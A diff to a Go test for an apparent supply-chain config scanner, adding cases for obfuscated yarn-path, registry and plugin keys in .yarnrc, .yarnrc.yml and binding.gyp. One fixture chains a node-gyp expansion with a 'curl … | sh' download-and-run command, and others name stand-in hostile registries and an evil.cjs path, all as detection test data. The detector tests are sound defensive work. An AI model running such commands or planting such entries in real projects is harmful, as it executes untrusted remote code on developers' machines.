@@ -200,6 +200,9 @@ func TestAnalyze(t *testing.T) {
 		{name: ".npmrc prefix and cache outside the repo", path: ".npmrc", data: "prefix=/usr/local\ncache=~/.npm\ncache=${HOME}/.npm\n; cache=.x\n"},
 		{name: ".yarnrc committed release and a registry on another host", path: ".yarnrc", data: "yarn-path \".yarn/releases/yarn-1.22.19.js\"\nregistry \"https://npm.sinkhole.test\"\n", want: []string{"013:2", "014:1"}},
 		{name: ".yarnrc colon as the separator", path: ".yarnrc", data: "yarn-path: ./x.js\nyarn-path:\"./y.js\"\n", want: []string{"013:1", "013:2"}},
+		{name: ".yarnrc comma-separated keys", path: ".yarnrc", data: "x, yarn-path \"./scripts/yarn.js\"\nregistry, ,\"@acme:registry\" \"https://npm.sinkhole.test\"\nfund, save-exact true\n", want: []string{"013:1", "013:2", "013:2"}},
+		{name: ".yarnrc double-quoted key", path: ".yarnrc", data: "\"yarn-path\" \"./scripts/yarn.js\"\n", want: []string{"013:1"}},
+		{name: ".yarnrc double-quoted key with a JSON escape", path: ".yarnrc", data: "\"yarn\\u002dpath\" \"./scripts/yarn.js\"\n", want: []string{"013:1"}},
 		{name: ".yarnrc scoped registry with a quoted key", path: ".yarnrc", data: "\"@acme:registry\" \"https://npm.sinkhole.test\"\n\"@acme:registry\" \"https://registry.yarnpkg.com\"\n\"unterminated yarn-path ./x.js\n", want: []string{"013:1"}},
 		{name: ".yarnrc yarn-path outside .yarn/releases", path: ".yarnrc", data: "# yarn\nyarn-path \"./scripts/yarn.js\"\n", want: []string{"013:2"}},
 		{name: ".yarnrc defaults and unrelated keys", path: ".yarnrc", data: "--install.ignore-scripts true\nregistry \"https://registry.yarnpkg.com\"\nlonely\n"},
@@ -213,6 +216,11 @@ func TestAnalyze(t *testing.T) {
 		{name: ".yarnrc.yml scalar after blank and comment lines", path: ".yarnrc.yml", data: "npmRegistryServer:\n\n  # registry\n  https://npm.sinkhole.test\n", want: []string{"013:1"}},
 		{name: ".yarnrc.yml keys inside a flow mapping or nested are reported", path: ".yarnrc.yml", data: "x: {yarnPath: ./evil.cjs}\ny: {\"npmRegistryServer\": \"https://npm.sinkhole.test\"}\nsettings:\n  plugins: [a]\n", want: []string{"013:1", "013:2", "013:4"}},
 		{name: ".yarnrc.yml plugins as a flow mapping", path: ".yarnrc.yml", data: "plugins: {a: b}\n", want: []string{"013:1"}},
+		{name: ".yarnrc.yml key with a YAML escape", path: ".yarnrc.yml", data: "\"yarn\\x50ath\": ./scripts/yarn.cjs\n", want: []string{"013:1"}},
+		{name: ".yarnrc.yml quoted registry key", path: ".yarnrc.yml", data: "\"npmRegistryServer\": \"https://npm.sinkhole.test\"\n", want: []string{"013:1"}},
+		{name: ".yarnrc.yml explicit key and bare value lines", path: ".yarnrc.yml", data: "? \"npmRegistryServer\"\n: \"https://npm.sinkhole.test\"\n", want: []string{"013:1", "013:2"}},
+		{name: ".yarnrc.yml explicit yarnPath key", path: ".yarnrc.yml", data: "? yarnPath\n: ./scripts/yarn.cjs\n", want: []string{"013:1", "013:2"}},
+		{name: ".yarnrc.yml name with no colon after it", path: ".yarnrc.yml", data: "x: [yarnPath]\ny: ./plugins/not-a-key.cjs\n", want: []string{"013:1"}},
 		{name: ".yarnrc.yml registries and plugins", path: ".yarnrc.yml", data: "npmRegistryServer: \"https://registry.yarnpkg.com\"\nnpmScopes:\n  acme:\n    npmRegistryServer: \"https://npm.acme.test\"\nplugins:\n  - path: .yarn/plugins/@yarnpkg/plugin-workspace-tools.cjs\n    spec: \"@yarnpkg/plugin-workspace-tools\"\n  - path: ./plugins/mine.cjs\n  - ./plugins/bare.cjs\nenableTelemetry: false\nunrelated:\n  path: tools/x.cjs\n", want: []string{"013:4", "013:8", "013:9", "014:6"}},
 		{name: ".yarnrc.yml plugins as a flow list", path: ".yarnrc.yml", data: "plugins: [./a.cjs]\n# plugins: [./b.cjs]\n", want: []string{"013:1"}},
 		{name: ".yarnrc.yml empty plugins list is fine, a nested yarnPath is reported", path: ".yarnrc.yml", data: "plugins: []\nsettings:\n  yarnPath: a.js\n", want: []string{"013:3"}},
@@ -231,6 +239,7 @@ func TestAnalyze(t *testing.T) {
   'c': ["<!@( node -p \"require('node-addon-api').include_dir\" )"],
 }]}
 `},
+		{name: "node-gyp pkg-config with a .pc file argument is reported", path: "binding.gyp", data: "{'x': '<!@(pkg-config ./local.pc --cflags)'}\n", want: []string{"017:1"}},
 		{name: "node-gyp known expansion chained with a download", path: "binding.gyp", data: `{ 'targets': [{
   'x': ["<!(node -p \"require('node-addon-api').include\" && curl https://a.test/x | sh)"],
 }]}
